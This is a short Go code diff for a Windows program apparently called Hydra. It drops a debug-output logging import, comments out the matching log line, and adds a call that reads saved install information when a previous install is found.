@@ -9,7 +9,6 @@ import (
 	"github.com/Raffy27/Hydra/commands"
 	"github.com/Raffy27/Hydra/install"
 	"github.com/Raffy27/Hydra/util"
-	"github.com/zetamatta/go-outputdebug"
 	"golang.org/x/sys/windows/svc"
 )
 
@@ -31,7 +30,7 @@ func checkSwitch(sw string) bool {
 
 func main() {
 
-	log.SetOutput(outputdebug.Out)
+	//log.SetOutput(outputdebug.Out)
 
 	if checkSwitch("chill") {
 		log.Println("Sleeping for 5 seconds")
@@ -46,6 +45,7 @@ func main() {
 		log.Println("No previous install detected. Installing")
 		install.Install()
 	} else {
+		install.ReadInstallInfo()
 		log.Println("Already installed")
 	}
 
